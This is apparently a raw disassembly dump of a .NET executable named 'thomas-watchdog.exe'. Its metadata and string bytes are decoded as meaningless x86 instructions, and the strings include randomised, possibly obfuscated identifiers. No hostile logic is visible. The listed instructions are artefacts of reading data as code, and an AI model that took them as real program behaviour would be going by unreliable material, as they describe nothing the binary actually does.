   14000256d:	00 00                	add    %al,(%rax)
   14000256f:	00 00                	add    %al,(%rax)
   140002571:	00 0a                	add    %cl,(%rdx)
   140002573:	00 01                	add    %al,(%rcx)
   140002575:	00 00                	add    %al,(%rax)
   140002577:	00 00                	add    %al,(%rax)
   140002579:	00 06                	add    %al,(%rsi)
   14000257b:	00 37                	add    %dh,(%rdi)
   14000257d:	00 30                	add    %dh,(%rax)
   14000257f:	00 06                	add    %al,(%rsi)
   140002581:	00 5e 01             	add    %bl,0x1(%rsi)
   140002584:	4c 01 06             	add    %r8,(%rsi)
   140002587:	00 75 01             	add    %dh,0x1(%rbp)
   14000258a:	4c 01 06             	add    %r8,(%rsi)
   14000258d:	00 92 01 4c 01 06    	add    %dl,0x6014c01(%rdx)
   140002593:	00 ab 01 4c 01 06    	add    %ch,0x6014c01(%rbx)
   140002599:	00 c6                	add    %al,%dh
   14000259b:	01 4c 01 06          	add    %ecx,0x6(%rcx,%rax,1)
   14000259f:	00 03                	add    %al,(%rbx)
   1400025a1:	02 e3                	add    %bl,%ah
   1400025a3:	01 06                	add    %eax,(%rsi)
   1400025a5:	00 23                	add    %ah,(%rbx)
   1400025a7:	02 e3                	add    %bl,%ah
   1400025a9:	01 06                	add    %eax,(%rsi)
   1400025ab:	00 5b 02             	add    %bl,0x2(%rbx)
   1400025ae:	51                   	push   %rcx
   1400025af:	02 06                	add    (%rsi),%al
   1400025b1:	00 6d 02             	add    %ch,0x2(%rbp)
   1400025b4:	30 00                	xor    %al,(%rax)
   1400025b6:	06                   	(bad)
   1400025b7:	00 7e 02             	add    %bh,0x2(%rsi)
   1400025ba:	30 00                	xor    %al,(%rax)
   1400025bc:	0a 00                	or     (%rax),%al
   1400025be:	9a                   	(bad)
   1400025bf:	02 88 02 0a 00 ac    	add    -0x53fff5fe(%rax),%cl
   1400025c5:	02 88 02 0a 00 d1    	add    -0x2efff5fe(%rax),%cl
   1400025cb:	02 88 02 0a 00 e9    	add    -0x16fff5fe(%rax),%cl
   1400025d1:	02 88 02 0a 00 f5    	add    -0xafff5fe(%rax),%cl
   1400025d7:	02 88 02 0a 00 0e    	add    0xe000a02(%rax),%cl
   1400025dd:	03 88 02 47 00 2d    	add    0x2d004702(%rax),%ecx
   1400025e3:	03 00                	add    (%rax),%eax
   1400025e5:	00 0a                	add    %cl,(%rdx)
   1400025e7:	00 56 03             	add    %dl,0x3(%rsi)
   1400025ea:	88 02                	mov    %al,(%rdx)
   1400025ec:	0a 00                	or     (%rax),%al
   1400025ee:	77 03                	ja     0x1400025f3
   1400025f0:	88 02                	mov    %al,(%rdx)
   1400025f2:	06                   	(bad)
   1400025f3:	00 91 03 30 00 06    	add    %dl,0x6003003(%rcx)
   1400025f9:	00 a8 03 30 00 06    	add    %ch,0x6003003(%rax)
   1400025ff:	00 dc                	add    %bl,%ah
   140002601:	03 30                	add    (%rax),%esi
   140002603:	00 0e                	add    %cl,(%rsi)
   140002605:	00 16                	add    %dl,(%rsi)
   140002607:	04 03                	add    $0x3,%al
   140002609:	04 0e                	add    $0xe,%al
   14000260b:	00 34 04             	add    %dh,(%rsp,%rax,1)
   14000260e:	03 04 06             	add    (%rsi,%rax,1),%eax
   140002611:	00 57 04             	add    %dl,0x4(%rdi)
   140002614:	51                   	push   %rcx
   140002615:	02 0e                	add    (%rsi),%cl
   140002617:	00 95 04 03 04 06    	add    %dl,0x6040304(%rbp)
   14000261d:	00 b4 04 a3 04 06 00 	add    %dh,0x604a3(%rsp,%rax,1)
   140002624:	cd 04                	int    $0x4
   140002626:	c1 04 06 00          	roll   $0x0,(%rsi,%rax,1)
   14000262a:	e0 04                	loopne 0x140002630
   14000262c:	30 00                	xor    %al,(%rax)
   14000262e:	06                   	(bad)
   14000262f:	00 29                	add    %ch,(%rcx)
   140002631:	05 0c 05 06 00       	add    $0x6050c,%eax
   140002636:	3c 05                	cmp    $0x5,%al
   140002638:	0c 05                	or     $0x5,%al
   14000263a:	06                   	(bad)
   14000263b:	00 4c 05 0c          	add    %cl,0xc(%rbp,%rax,1)
   14000263f:	05 06 00 6b 05       	add    $0x56b0006,%eax
   140002644:	0c 05                	or     $0x5,%al
   140002646:	06                   	(bad)
   140002647:	00 7f 05             	add    %bh,0x5(%rdi)
   14000264a:	0c 05                	or     $0x5,%al
   14000264c:	06                   	(bad)
   14000264d:	00 8b 05 0c 05 06    	add    %cl,0x6050c05(%rbx)
   140002653:	00 bc 05 51 02 06 00 	add    %bh,0x60251(%rbp,%rax,1)
   14000265a:	c9                   	leave
   14000265b:	05 0c 05 06 00       	add    $0x6050c,%eax
   140002660:	d6                   	udb
   140002661:	05 51 02 06 00       	add    $0x60251,%eax
   140002666:	dd 05 0c 05 06 00    	fldl   0x6050c(%rip)        # 0x140062b78
   14000266c:	5a                   	pop    %rdx
   14000266d:	06                   	(bad)
   14000266e:	30 00                	xor    %al,(%rax)
   140002670:	06                   	(bad)
   140002671:	00 79 06             	add    %bh,0x6(%rcx)
   140002674:	5f                   	pop    %rdi
   140002675:	06                   	(bad)
   140002676:	06                   	(bad)
   140002677:	00 94 06 5f 06 06 00 	add    %dl,0x6065f(%rsi,%rax,1)
   14000267e:	a5                   	movsl  (%rsi),(%rdi)
   14000267f:	06                   	(bad)
   140002680:	5f                   	pop    %rdi
   140002681:	06                   	(bad)
   140002682:	2b 00                	sub    (%rax),%eax
   140002684:	c1 06 00             	roll   $0x0,(%rsi)
   140002687:	00 00                	add    %al,(%rax)
   140002689:	00 00                	add    %al,(%rax)
   14000268b:	00 01                	add    %al,(%rcx)
   14000268d:	00 00                	add    %al,(%rax)
   14000268f:	00 00                	add    %al,(%rax)
   140002691:	00 01                	add    %al,(%rcx)
   140002693:	00 01                	add    %al,(%rcx)
   140002695:	00 01                	add    %al,(%rcx)
   140002697:	00 10                	add    %dl,(%rax)
   140002699:	00 1e                	add    %bl,(%rsi)
   14000269b:	00 00                	add    %al,(%rax)
   14000269d:	00 05 00 01 00 01    	add    %al,0x1000100(%rip)        # 0x1410027a3
   1400026a3:	00 16                	add    %dl,(%rsi)
   1400026a5:	00 3e                	add    %bh,(%rsi)
   1400026a7:	00 0a                	add    %cl,(%rdx)
   1400026a9:	00 16                	add    %dl,(%rsi)
   1400026ab:	00 5f 00             	add    %bl,0x0(%rdi)
   1400026ae:	0e                   	(bad)
   1400026af:	00 16                	add    %dl,(%rsi)
   1400026b1:	00 86 00 11 00 50    	add    %al,0x50001100(%rsi)
   1400026b7:	20 00                	and    %al,(%rax)
   1400026b9:	00 00                	add    %al,(%rax)
   1400026bb:	00 96 00 92 00 14    	add    %dl,0x14009200(%rsi)
   1400026c1:	00 01                	add    %al,(%rcx)
   1400026c3:	00 94 20 00 00 00 00 	add    %dl,0x0(%rax,%riz,1)
   1400026ca:	96                   	xchg   %eax,%esi
   1400026cb:	00 97 00 14 00 01    	add    %dl,0x1001400(%rdi)
   1400026d1:	00 fc                	add    %bh,%ah
   1400026d3:	22 00                	and    (%rax),%al
   1400026d5:	00 00                	add    %al,(%rax)
   1400026d7:	00 96 00 ae 00 18    	add    %dl,0x1800ae00(%rsi)
   1400026dd:	00 01                	add    %al,(%rcx)
   1400026df:	00 14 23             	add    %dl,(%rbx,%riz,1)
   1400026e2:	00 00                	add    %al,(%rax)
   1400026e4:	00 00                	add    %al,(%rax)
   1400026e6:	96                   	xchg   %eax,%esi
   1400026e7:	00 d0                	add    %dl,%al
   1400026e9:	00 1d 00 02 00 f8    	add    %bl,-0x7fffe00(%rip)        # 0x1380028ef
   1400026ef:	23 00                	and    (%rax),%eax
   1400026f1:	00 00                	add    %al,(%rax)
   1400026f3:	00 96 00 f8 00 25    	add    %dl,0x2500f800(%rsi)
   1400026f9:	00 04 00             	add    %al,(%rax,%rax,1)
   1400026fc:	b2 24                	mov    $0x24,%dl
   1400026fe:	00 00                	add    %al,(%rax)
   140002700:	00 00                	add    %al,(%rax)
   140002702:	86 18                	xchg   %bl,(%rax)
   140002704:	11 01                	adc    %eax,(%rcx)
   140002706:	2b 00                	sub    (%rax),%eax
   140002708:	06                   	(bad)
   140002709:	00 5c 24 00          	add    %bl,0x0(%rsp)
   14000270d:	00 00                	add    %al,(%rax)
   14000270f:	00 91 18 53 06 14    	add    %dl,0x14065318(%rcx)
   140002715:	00 06                	add    %al,(%rsi)
   140002717:	00 00                	add    %al,(%rax)
   140002719:	00 01                	add    %al,(%rcx)
   14000271b:	00 17                	add    %dl,(%rdi)
   14000271d:	01 00                	add    %eax,(%rax)
   14000271f:	00 01                	add    %al,(%rcx)
   140002721:	00 17                	add    %dl,(%rdi)
   140002723:	01 10                	add    %edx,(%rax)
   140002725:	10 02                	adc    %al,(%rdx)
   140002727:	00 33                	add    %dh,(%rbx)
   140002729:	01 00                	add    %eax,(%rax)
   14000272b:	00 01                	add    %al,(%rcx)
   14000272d:	00 17                	add    %dl,(%rdi)
   14000272f:	01 00                	add    %eax,(%rax)
   140002731:	00 02                	add    %al,(%rdx)
   140002733:	00 33                	add    %dh,(%rbx)
   140002735:	01 11                	add    %edx,(%rcx)
   140002737:	00 11                	add    %dl,(%rcx)
   140002739:	01 31                	add    %esi,(%rcx)
   14000273b:	00 19                	add    %bl,(%rcx)
   14000273d:	00 11                	add    %dl,(%rcx)
   14000273f:	01 31                	add    %esi,(%rcx)
   140002741:	00 21                	add    %ah,(%rcx)
   140002743:	00 11                	add    %dl,(%rcx)
   140002745:	01 31                	add    %esi,(%rcx)
   140002747:	00 29                	add    %ch,(%rcx)
   140002749:	00 11                	add    %dl,(%rcx)
   14000274b:	01 31                	add    %esi,(%rcx)
   14000274d:	00 31                	add    %dh,(%rcx)
   14000274f:	00 11                	add    %dl,(%rcx)
   140002751:	01 31                	add    %esi,(%rcx)
   140002753:	00 39                	add    %bh,(%rcx)
   140002755:	00 11                	add    %dl,(%rcx)
   140002757:	01 36                	add    %esi,(%rsi)
   140002759:	00 41 00             	add    %al,0x0(%rcx)
   14000275c:	11 01                	adc    %eax,(%rcx)
   14000275e:	2b 00                	sub    (%rax),%eax
   140002760:	49 00 60 02          	rex.WB add %spl,0x2(%r8)
   140002764:	3b 00                	cmp    (%rax),%eax
   140002766:	51                   	push   %rcx
   140002767:	00 79 02             	add    %bh,0x2(%rcx)
   14000276a:	41 00 61 00          	add    %spl,0x0(%r9)
   14000276e:	11 01                	adc    %eax,(%rcx)
   140002770:	2b 00                	sub    (%rax),%eax
   140002772:	61                   	(bad)
   140002773:	00 bf 02 4f 00 71    	add    %bh,0x71004f02(%rdi)
   140002779:	00 11                	add    %dl,(%rcx)
   14000277b:	01 55 00             	add    %edx,0x0(%rbp)
   14000277e:	71 00                	jno    0x140002780
   140002780:	e1 02                	loope  0x140002784
   140002782:	2b 00                	sub    (%rax),%eax
   140002784:	79 00                	jns    0x140002786
   140002786:	11 01                	adc    %eax,(%rcx)
   140002788:	31 00                	xor    %eax,(%rax)
   14000278a:	81 00 11 01 5c 00    	addl   $0x5c0111,(%rax)
   140002790:	81 00 29 03 64 00    	addl   $0x640329,(%rax)
   140002796:	89 00                	mov    %eax,(%rax)
   140002798:	48 03 69 00          	add    0x0(%rcx),%rbp
   14000279c:	91                   	xchg   %eax,%ecx
   14000279d:	00 6b 03             	add    %ch,0x3(%rbx)
   1400027a0:	6e                   	outsb  (%rsi),(%dx)
   1400027a1:	00 99 00 88 03 73    	add    %bl,0x73038800(%rcx)
   1400027a7:	00 a9 00 98 03 78    	add    %ch,0x78039800(%rcx)
   1400027ad:	00 91 00 9f 03 7e    	add    %dl,0x7e039f00(%rcx)
   1400027b3:	00 b1 00 b4 03 2b    	add    %dh,0x2b03b400(%rcx)
   1400027b9:	00 a9 00 bc 03 82    	add    %ch,-0x7dfc4400(%rcx)
   1400027bf:	00 09                	add    %cl,(%rcx)
   1400027c1:	00 c3                	add    %al,%bl
   1400027c3:	03 88 00 a9 00 cc    	add    -0x33ff5700(%rax),%ecx
   1400027c9:	03 8c 00 49 00 d5 03 	add    0x3d50049(%rax,%rax,1),%ecx
   1400027d0:	91                   	xchg   %eax,%ecx
   1400027d1:	00 a9 00 ed 03 96    	add    %ch,-0x69fc1300(%rcx)
   1400027d7:	00 49 00             	add    %cl,0x0(%rcx)
   1400027da:	f5                   	cmc
   1400027db:	03 9d 00 c1 00 11    	add    0x1100c100(%rbp),%ebx
   1400027e1:	01 2b                	add    %ebp,(%rbx)
   1400027e3:	00 c1                	add    %al,%cl
   1400027e5:	00 27                	add    %ah,(%rdi)
   1400027e7:	04 31                	add    $0x31,%al
   1400027e9:	00 c1                	add    %al,%cl
   1400027eb:	00 47 04             	add    %al,0x4(%rdi)
   1400027ee:	a4                   	movsb  (%rsi),(%rdi)
   1400027ef:	00 d1                	add    %dl,%cl
   1400027f1:	00 5c 04 18          	add    %bl,0x18(%rsp,%rax,1)
   1400027f5:	00 c1                	add    %al,%cl
   1400027f7:	00 6d 04             	add    %ch,0x4(%rbp)
   1400027fa:	31 00                	xor    %eax,(%rax)
   1400027fc:	c1 00 82             	roll   $0x82,(%rax)
   1400027ff:	04 aa                	add    $0xaa,%al
   140002801:	00 d9                	add    %bl,%cl
   140002803:	00 9d 04 af 00 e1    	add    %bl,-0x1eff50fc(%rbp)
   140002809:	00 bb 04 41 00 e9    	add    %bh,-0x16ffbefc(%rbx)
   14000280f:	00 d6                	add    %dl,%dh
   140002811:	04 d0                	add    $0xd0,%al
   140002813:	00 f1                	add    %dh,%cl
   140002815:	00 e8                	add    %ch,%al
   140002817:	04 3b                	add    $0x3b,%al
   140002819:	00 e9                	add    %ch,%cl
   14000281b:	00 f9                	add    %bh,%cl
   14000281d:	04 d5                	add    $0xd5,%al
   14000281f:	00 e9                	add    %ch,%cl
   140002821:	00 03                	add    %al,(%rbx)
   140002823:	05 db 00 f9 00       	add    $0xf900db,%eax
   140002828:	11 01                	adc    %eax,(%rcx)
   14000282a:	e1 00                	loope  0x14000282c
   14000282c:	01 01                	add    %eax,(%rcx)
   14000282e:	11 01                	adc    %eax,(%rcx)
   140002830:	2b 00                	sub    (%rax),%eax
   140002832:	09 01                	or     %eax,(%rcx)
   140002834:	5f                   	pop    %rdi
   140002835:	05 36 00 09 01       	add    $0x1090036,%eax
   14000283a:	76 05                	jbe    0x140002841
   14000283c:	e9 00 19 01 03       	jmp    0x143014141
   140002841:	05 f0 00 09 01       	add    $0x10900f0,%eax
   140002846:	9c                   	pushf
   140002847:	05 f6 00 09 01       	add    $0x10900f6,%eax
   14000284c:	ac                   	lods   (%rsi),%al
   14000284d:	05 f6 00 29 01       	add    $0x12900f6,%eax
   140002852:	11 01                	adc    %eax,(%rcx)
   140002854:	2b 00                	sub    (%rax),%eax
   140002856:	31 01                	xor    %eax,(%rcx)
   140002858:	11 01                	adc    %eax,(%rcx)
   14000285a:	00 01                	add    %al,(%rcx)
   14000285c:	39 01                	cmp    %eax,(%rcx)
   14000285e:	ee                   	out    %al,(%dx)
   14000285f:	05 0d 01 39 01       	add    $0x139010d,%eax
   140002864:	f4                   	hlt
   140002865:	05 2b 00 29 01       	add    $0x129002b,%eax
   14000286a:	fa                   	cli
   14000286b:	05 15 01 c1 00       	add    $0xc10115,%eax
   140002870:	02 06                	add    (%rsi),%al
   140002872:	31 00                	xor    %eax,(%rax)
   140002874:	51                   	push   %rcx
   140002875:	00 10                	add    %dl,(%rax)
   140002877:	06                   	(bad)
   140002878:	32 01                	xor    (%rcx),%al
   14000287a:	c1 00 24             	roll   $0x24,(%rax)
   14000287d:	06                   	(bad)
   14000287e:	aa                   	stos   %al,(%rdi)
   14000287f:	00 c1                	add    %al,%cl
   140002881:	00 38                	add    %bh,(%rax)
   140002883:	06                   	(bad)
   140002884:	aa                   	stos   %al,(%rdi)
   140002885:	00 51 01             	add    %dl,0x1(%rcx)
   140002888:	89 06                	mov    %eax,(%rsi)
   14000288a:	3b 01                	cmp    (%rcx),%eax
   14000288c:	59                   	pop    %rcx
   14000288d:	01 11                	add    %edx,(%rcx)
   14000288f:	01 41 01             	add    %eax,0x1(%rcx)
   140002892:	59                   	pop    %rcx
   140002893:	01 b8 06 48 01 51    	add    %edi,0x51014806(%rax)
   140002899:	00 cf                	add    %cl,%bh
   14000289b:	06                   	(bad)
   14000289c:	4f 01 d1             	rex.WRXB add %r10,%r9
   14000289f:	00 dd                	add    %bl,%ch
   1400028a1:	06                   	(bad)
   1400028a2:	56                   	push   %rsi
   1400028a3:	01 09                	add    %ecx,(%rcx)
   1400028a5:	00 11                	add    %dl,(%rcx)
   1400028a7:	01 2b                	add    %ebp,(%rbx)
   1400028a9:	00 02                	add    %al,(%rdx)
   1400028ab:	00 0d 00 2f 00 2e    	add    %cl,0x2e002f00(%rip)        # 0x16e0057b1
   1400028b1:	00 0b                	add    %cl,(%rbx)
   1400028b3:	00 5c 01 2e          	add    %bl,0x2e(%rcx,%rax,1)
   1400028b7:	00 13                	add    %dl,(%rbx)
   1400028b9:	00 5c 01 2e          	add    %bl,0x2e(%rcx,%rax,1)
   1400028bd:	00 1b                	add    %bl,(%rbx)
   1400028bf:	00 7b 01             	add    %bh,0x1(%rbx)
   1400028c2:	2e 00 23             	cs add %ah,(%rbx)
   1400028c5:	00 a7 01 2e 00 2b    	add    %ah,0x2b002e01(%rdi)
   1400028cb:	00 db                	add    %bl,%bl
   1400028cd:	01 2e                	add    %ebp,(%rsi)
   1400028cf:	00 33                	add    %dh,(%rbx)
   1400028d1:	00 ef                	add    %ch,%bh
   1400028d3:	01 2e                	add    %ebp,(%rsi)
   1400028d5:	00 3b                	add    %bh,(%rbx)
   1400028d7:	00 f8                	add    %bh,%al
   1400028d9:	01 b6 00 1a 01 36    	add    %esi,0x36011a00(%rsi)
   1400028df:	01 04 80             	add    %eax,(%rax,%rax,4)
	...
   1400028f2:	41 02 00             	add    (%r8),%al
   1400028f5:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140002900:	00 00                	add    %al,(%rax)
   140002902:	01 00                	add    %eax,(%rax)
   140002904:	27                   	(bad)
   140002905:	00 00                	add    %al,(%rax)
   140002907:	00 00                	add    %al,(%rax)
   140002909:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140002914:	00 00                	add    %al,(%rax)
   140002916:	46 00 88 02 00 00 00 	rex.RX add %r9b,0x2(%rax)
   14000291d:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140002928:	00 00                	add    %al,(%rax)
   14000292a:	01 00                	add    %eax,(%rax)
   14000292c:	30 00                	xor    %al,(%rax)
   14000292e:	00 00                	add    %al,(%rax)
   140002930:	00 00                	add    %al,(%rax)
   140002932:	00 00                	add    %al,(%rax)
   140002934:	00 3c 4d 6f 64 75 6c 	add    %bh,0x6c75646f(,%rcx,2)
   14000293b:	65 3e 00 74 68 6f    	gs add %dh,%gs:0x6f(%rax,%rbp,2)
   140002941:	6d                   	insl   (%dx),(%rdi)
   140002942:	61                   	(bad)
   140002943:	73 2d                	jae    0x140002972
   140002945:	77 61                	ja     0x1400029a8
   140002947:	74 63                	je     0x1400029ac
   140002949:	68 64 6f 67 2e       	push   $0x2e676f64
   14000294e:	65 78 65             	gs js  0x1400029b6
   140002951:	00 52 50             	add    %dl,0x50(%rdx)
   140002954:	72 6f                	jb     0x1400029c5
   140002956:	67 72 61             	addr32 jb 0x1400029ba
   140002959:	6d                   	insl   (%dx),(%rdi)
   14000295a:	00 6d 73             	add    %ch,0x73(%rbp)
   14000295d:	63 6f 72             	movsxd 0x72(%rdi),%ebp
   140002960:	6c                   	insb   (%dx),(%rdi)
   140002961:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%rdx),%esp
   140002968:	65 6d                	gs insl (%dx),(%rdi)
   14000296a:	00 4f 62             	add    %cl,0x62(%rdi)
   14000296d:	6a 65                	push   $0x65
   14000296f:	63 74 00 62          	movsxd 0x62(%rax,%rax,1),%esi
   140002973:	6f                   	outsl  (%rsi),(%dx)
   140002974:	6b 6a 6d 6d          	imul   $0x6d,0x6d(%rdx),%ebp
   140002978:	73 78                	jae    0x1400029f2
   14000297a:	63 75 78             	movsxd 0x78(%rbp),%esi
   14000297d:	6a 75                	push   $0x75
   14000297f:	6e                   	outsb  (%rsi),(%dx)
   140002980:	64 78 6c             	fs js  0x1400029ef
   140002983:	71 71                	jno    0x1400029f6
   140002985:	70 65                	jo     0x1400029ec
   140002987:	77 68                	ja     0x1400029f1
   140002989:	71 74                	jno    0x1400029ff
   14000298b:	6d                   	insl   (%dx),(%rdi)
   14000298c:	67 66 77 6c          	addr32 data16 ja 0x1400029fc
   140002990:	78 6d                	js     0x1400029ff
   140002992:	00 68 6f             	add    %ch,0x6f(%rax)
   140002995:	6f                   	outsl  (%rsi),(%dx)
   140002996:	76 66                	jbe    0x1400029fe
   140002998:	6a 6e                	push   $0x6e
   14000299a:	6a 70                	push   $0x70
   14000299c:	72 7a                	jb     0x140002a18
   14000299e:	73 68                	jae    0x140002a08
   1400029a0:	6f                   	outsl  (%rsi),(%dx)
   1400029a1:	72 70                	jb     0x140002a13
   1400029a3:	75 70                	jne    0x140002a15
   1400029a5:	72 6d                	jb     0x140002a14
   1400029a7:	6d                   	insl   (%dx),(%rdi)
   1400029a8:	6c                   	insb   (%dx),(%rdi)
   1400029a9:	65 72 78             	gs jb  0x140002a24
   1400029ac:	6d                   	insl   (%dx),(%rdi)
   1400029ad:	61                   	(bad)
   1400029ae:	75 78                	jne    0x140002a28
   1400029b0:	74 75                	je     0x140002a27
   1400029b2:	69 68 6b 77 64 65 73 	imul   $0x73656477,0x6b(%rax),%ebp
   1400029b9:	00 66 75             	add    %ah,0x75(%rsi)
   1400029bc:	72 6d                	jb     0x140002a2b
   1400029be:	63 6a 6b             	movsxd 0x6b(%rdx),%ebp
   1400029c1:	6c                   	insb   (%dx),(%rdi)
   1400029c2:	73 6f                	jae    0x140002a33
   1400029c4:	65 00 4d 61          	add    %cl,%gs:0x61(%rbp)
   1400029c8:	69 6e 00 79 72 73 78 	imul   $0x78737279,0x0(%rsi),%ebp
   1400029cf:	6b 74 70 71 68       	imul   $0x68,0x71(%rax,%rsi,2),%esi
   1400029d4:	6b 73 7a 69          	imul   $0x69,0x7a(%rbx),%esi
   1400029d8:	63 62 75             	movsxd 0x75(%rdx),%esp
   1400029db:	75 78                	jne    0x140002a55
   1400029dd:	63 6a 6d             	movsxd 0x6d(%rdx),%ebp
   1400029e0:	71 00                	jno    0x1400029e2
   1400029e2:	75 72                	jne    0x140002a56
   1400029e4:	61                   	(bad)
   1400029e5:	68 76 6a 68 78       	push   $0x78686a76
   1400029ea:	77 68                	ja     0x140002a54
   1400029ec:	67 6b 68 76 6c       	imul   $0x6c,0x76(%eax),%ebp
   1400029f1:	76 63                	jbe    0x140002a56
   1400029f3:	6a 77                	push   $0x77
   1400029f5:	6b 74 79 6c 67       	imul   $0x67,0x6c(%rcx,%rdi,2),%esi
   1400029fa:	6b 75 79 6a          	imul   $0x6a,0x79(%rbp),%esi
   1400029fe:	6f                   	outsl  (%rsi),(%dx)
   1400029ff:	77 78                	ja     0x140002a79
   140002a01:	78 74                	js     0x140002a77
   140002a03:	00 6a 6a             	add    %ch,0x6a(%rdx)
   140002a06:	6e                   	outsb  (%rsi),(%dx)
   140002a07:	74 76                	je     0x140002a7f
   140002a09:	66 6f                	outsw  (%rsi),(%dx)
   140002a0b:	76 70                	jbe    0x140002a7d
   140002a0d:	74 73                	je     0x140002a82
   140002a0f:	77 6e                	ja     0x140002a7f
   140002a11:	77 6d                	ja     0x140002a80
   140002a13:	64 73 74             	fs jae 0x140002a8a
   140002a16:	6b 6a 61 66          	imul   $0x66,0x61(%rdx),%ebp
   140002a1a:	6f                   	outsl  (%rsi),(%dx)
   140002a1b:	71 77                	jno    0x140002a94
   140002a1d:	7a 73                	jp     0x140002a92
   140002a1f:	6c                   	insb   (%dx),(%rdi)
   140002a20:	66 6a 67             	pushw  $0x67
   140002a23:	6b 76 6e 6f          	imul   $0x6f,0x6e(%rsi),%esi
   140002a27:	67 71 61             	addr32 jno 0x140002a8b
   140002a2a:	66 00 62 64          	data16 add %ah,0x64(%rdx)
   140002a2e:	6e                   	outsb  (%rsi),(%dx)
   140002a2f:	79 62                	jns    0x140002a93
   140002a31:	77 72                	ja     0x140002aa5
   140002a33:	77 65                	ja     0x140002a9a
   140002a35:	65 6f                	outsl  %gs:(%rsi),(%dx)
   140002a37:	66 68 68 75          	pushw  $0x7568
   140002a3b:	76 78                	jbe    0x140002ab5
   140002a3d:	75 78                	jne    0x140002ab7
   140002a3f:	74 62                	je     0x140002aa3
   140002a41:	71 79                	jno    0x140002abc
   140002a43:	73 00                	jae    0x140002a45
   140002a45:	2e 63 74 6f 72       	cs movsxd 0x72(%rdi,%rbp,2),%esi
   140002a4a:	00 65 79             	add    %ah,0x79(%rbp)
   140002a4d:	7a 66                	jp     0x140002ab5
   140002a4f:	77 71                	ja     0x140002ac2
   140002a51:	6f                   	outsl  (%rsi),(%dx)
   140002a52:	67 63 67 72          	movsxd 0x72(%edi),%esp
   140002a56:	65 6c                	gs insb (%dx),(%rdi)
   140002a58:	79 78                	jns    0x140002ad2
   140002a5a:	6e                   	outsb  (%rsi),(%dx)
   140002a5b:	6c                   	insb   (%dx),(%rdi)
   140002a5c:	73 73                	jae    0x140002ad1
   140002a5e:	6a 71                	push   $0x71
   140002a60:	68 78 66 6e 64       	push   $0x646e6678
   140002a65:	62                   	(bad)
   140002a66:	00 6c 61 6f          	add    %ch,0x6f(%rcx,%riz,2)
   140002a6a:	65 6a 76             	gs push $0x76
   140002a6d:	79 64                	jns    0x140002ad3
   140002a6f:	67 72 6e             	addr32 jb 0x140002ae0
   140002a72:	6b 65 6b 74          	imul   $0x74,0x6b(%rbp),%esp
   140002a76:	68 70 67 76 75       	push   $0x75766770
   140002a7b:	61                   	(bad)
   140002a7c:	7a 6e                	jp     0x140002aec
   140002a7e:	64 00 53 79          	add    %dl,%fs:0x79(%rbx)
   140002a82:	73 74                	jae    0x140002af8
   140002a84:	65 6d                	gs insl (%dx),(%rdi)
   140002a86:	2e 52                	cs push %rdx
   140002a88:	65 66 6c             	gs data16 insb (%dx),(%rdi)
   140002a8b:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140002a90:	6e                   	outsb  (%rsi),(%dx)
   140002a91:	00 41 73             	add    %al,0x73(%rcx)
   140002a94:	73 65                	jae    0x140002afb
   140002a96:	6d                   	insl   (%dx),(%rdi)
   140002a97:	62 6c 79 54 69       	(bad)
   140002a9c:	74 6c                	je     0x140002b0a
   140002a9e:	65 41 74 74          	gs rex.B je 0x140002b16
   140002aa2:	72 69                	jb     0x140002b0d
   140002aa4:	62 75 74 65 00       	(bad)
   140002aa9:	41 73 73             	rex.B jae 0x140002b1f
   140002aac:	65 6d                	gs insl (%dx),(%rdi)
   140002aae:	62 6c 79 44 65       	(bad)
   140002ab3:	73 63                	jae    0x140002b18
   140002ab5:	72 69                	jb     0x140002b20
   140002ab7:	70 74                	jo     0x140002b2d
   140002ab9:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   140002ac0:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%rdx),%esp
   140002ac7:	73 73                	jae    0x140002b3c
   140002ac9:	65 6d                	gs insl (%dx),(%rdi)
   140002acb:	62 6c 79 50 72       	(bad)
   140002ad0:	6f                   	outsl  (%rsi),(%dx)
   140002ad1:	64 75 63             	fs jne 0x140002b37
   140002ad4:	74 41                	je     0x140002b17
   140002ad6:	74 74                	je     0x140002b4c
   140002ad8:	72 69                	jb     0x140002b43
   140002ada:	62 75 74 65 00       	(bad)
   140002adf:	41 73 73             	rex.B jae 0x140002b55
   140002ae2:	65 6d                	gs insl (%dx),(%rdi)
   140002ae4:	62 6c 79 43 6f       	(bad)
   140002ae9:	70 79                	jo     0x140002b64
   140002aeb:	72 69                	jb     0x140002b56
   140002aed:	67 68 74 41 74 74    	addr32 push $0x74744174
   140002af3:	72 69                	jb     0x140002b5e
   140002af5:	62 75 74 65 00       	(bad)
   140002afa:	41 73 73             	rex.B jae 0x140002b70
   140002afd:	65 6d                	gs insl (%dx),(%rdi)
   140002aff:	62 6c 79 46 69       	(bad)
   140002b04:	6c                   	insb   (%dx),(%rdi)
   140002b05:	65 56                	gs push %rsi
   140002b07:	65 72 73             	gs jb  0x140002b7d
   140002b0a:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   140002b11:	69 62 75 74 65 00 53 	imul   $0x53006574,0x75(%rdx),%esp
   140002b18:	79 73                	jns    0x140002b8d
   140002b1a:	74 65                	je     0x140002b81
   140002b1c:	6d                   	insl   (%dx),(%rdi)
   140002b1d:	2e 52                	cs push %rdx
   140002b1f:	75 6e                	jne    0x140002b8f
   140002b21:	74 69                	je     0x140002b8c
   140002b23:	6d                   	insl   (%dx),(%rdi)
   140002b24:	65 2e 43 6f          	gs rex.XB outsl %gs:(%rsi),(%dx)
   140002b28:	6d                   	insl   (%dx),(%rdi)
   140002b29:	70 69                	jo     0x140002b94
   140002b2b:	6c                   	insb   (%dx),(%rdi)
   140002b2c:	65 72 53             	gs jb  0x140002b82
   140002b2f:	65 72 76             	gs jb  0x140002ba8
   140002b32:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%rbx),%esp
   140002b39:	6d                   	insl   (%dx),(%rdi)
   140002b3a:	70 69                	jo     0x140002ba5
   140002b3c:	6c                   	insb   (%dx),(%rdi)
   140002b3d:	61                   	(bad)
   140002b3e:	74 69                	je     0x140002ba9
   140002b40:	6f                   	outsl  (%rsi),(%dx)
   140002b41:	6e                   	outsb  (%rsi),(%dx)
   140002b42:	52                   	push   %rdx
